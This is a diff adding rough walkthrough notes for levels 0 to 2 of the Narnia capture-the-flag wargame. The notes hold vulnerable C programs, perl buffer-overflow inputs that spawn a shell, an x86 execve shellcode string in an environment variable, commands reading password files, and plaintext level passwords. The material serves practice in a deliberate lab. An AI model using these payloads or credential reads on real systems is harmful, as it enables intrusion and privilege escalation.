@@ -1,2 +1,126 @@
+.____              .___.__                                       .___
+|    |    __ __  __| _/|__| ____________   ____  ______ ____   __| _/
+|    |   |  |  \/ __ | |  |/  ___/\____ \ /  _ \/  ___// __ \ / __ | 
+|    |___|  |  / /_/ | |  |\___ \ |  |_> >  <_> )___ \\  ___// /_/ | 
+|_______ \____/\____ | |__/____  >|   __/ \____/____  >\___  >____ | 
+        \/          \/         \/ |__|              \/     \/     \/ 
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$ cd C:\Program Files\PuTTY                                                    $$
+$$ putty.exe $ssh [level]@narnia.labs.overthewire.org -P 2226 -pw [password]    $$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+** Commands **
+$$$$$$$$$$$$$$
+$$$ 000000 $$$
+$$$$$$$$$$$$$$
+
+cd ../../
+cd narnia
+cat narnia0
+
+------------------------------------------------------------------
+int main(){
+        long val=0x41414141;
+        char buf[20];
+
+        printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+        printf("Here is your chance: ");
+        scanf("%24s",&buf);
+
+        printf("buf: %s\n",buf);
+        printf("val: 0x%08x\n",val);
+
+        if(val==0xdeadbeef){
+        setreuid(geteuid(),geteuid());
+                system("/bin/sh");
+    }
+        else {
+                printf("WAY OFF!!!!\n");
+                exit(1);
+        }
+
+        return 0;
+}
+-------------------------------------------------------------------
+
+# Buffer is 20 chars long
+# We need to put in deadbeef
+
+perl -e 'print "a" x 20 . "\xde\xad\xbe\xef"'; | ./narnia0
+# deadbeef is all scrambled
+
+perl -e 'print "a" x 20 . "\xef\xbe\xad\xde"' | ./narnia0
+# Need something to keep the shell open
+
+(perl -e 'print "a" x 20 . "\xef\xbe\xad\xde"'; cat ) | ./narnia0
+whoami
+-- narnia1
+cat /etc/narnia_pass/narnia1
+
+$$$$$$$$$$$$$$
+$$$ 111111 $$$
+$$$$$$$$$$$$$$
+
+cd ../../
+cd narnia
+cat narnia1.c
+
+-----------------------------------------------------------------------------------
+#include <stdio.h>
+
+int main(){
+        int (*ret)();
+
+        if(getenv("EGG")==NULL){
+                printf("Give me something to execute at the env-variable EGG\n");
+                exit(1);
+        }
+
+        printf("Trying to execute EGG!\n");
+        ret = getenv("EGG");
+        ret();
+
+        return 0;
+}
+------------------------------------------------------------------------------------
+
+export EGG=$(perl -e 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
+./narnia1
+
+whoami
+cat /etc/narnia_pass_narnia2
+
+$$$$$$$$$$$$$$
+$$$ 222222 $$$
+$$$$$$$$$$$$$$
+
+cd ../../
+cd narnia
+cat narnia2.c
+
+-----------------------------------------------------------------------------------------
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main(int argc, char * argv[]){
+        char buf[128];
+
+        if(argc == 1){
+                printf("Usage: %s argument\n", argv[0]);
+                exit(1);
+        }
+        strcpy(buf,argv[1]);
+        printf("%s", buf);
+
+        return 0;
+}
+
+-----------------------------------------------------------------------------------------
+
+
+
 ** Passwords **
-narnia1:efeidiedae
+narnia0:efeidiedae
+nairiepecu
